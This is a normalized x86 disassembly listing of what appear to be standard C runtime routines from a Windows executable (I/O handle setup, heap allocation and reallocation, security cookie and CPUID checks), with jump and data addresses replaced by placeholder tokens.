add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_40531e
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_4057b5
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_408f73
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_408f73
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_4079b2
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_4079d6
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_4079fa
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
call sub_4054fd
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_405534
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
cmp [ ebp - 0x4 ] 0x2
pop esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
push 0x3
pop eax
leave
retn
cmp [ ebp - 0x8 ] 0x5
jb r-xdata
xor eax eax
inc eax
leave
retn
sub_407a55
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call sub_4079fa
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
push 0x3f8
call sub_4080e0
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_407aaf
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_407b93
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_407b43
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_407c00
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_408f73
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_407cb3
push 0xc
push r--data
call sub_405770
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_407109
push 0x1e
call sub_406f69
push 0xff
call sub_40549e
push 0x18
call sub_4052de
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_407d76
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_406b99
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_4057b5
retn
push edi
call sub_405a68
pop ecx
push 0xfa0
push edi
call sub_408f73
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_405a68
pop ecx
call sub_406b99
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407d6d
mov eax [ ebp - 0x1c ]
sub_407d76
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_407cb3
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_405454
pop ecx
sub_407da7
push 0xc
push r--data
call sub_405770
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_406b99
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_406efa
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_4057b5
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_406ca2
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_407d76
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4088fc
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407ea3
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_4031e0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_407ec5
push 0x10
push r--data
call sub_405770
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_405c3e
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_405a68
pop ecx
jmp r-xdata
call sub_4057b5
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_406ca2
pop ecx
call sub_406b99
push 0x4
call sub_407d76
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_408128
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408009
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_40861d
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_406ca2
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_4088fc
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_406b99
call sub_406b99
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_406ca2
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_406b5e
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_406b99
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_406b99
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_402b50
push ebx
call sub_408128
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_408153
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_406b5e
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_402b50
push ebx
push [ ebp - 0x20 ]
call sub_408153
add esp 0x14
mov eax esi
sub_4080e0
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_408128
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_408153
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4026b0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_408467
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_408517
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_40861d
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
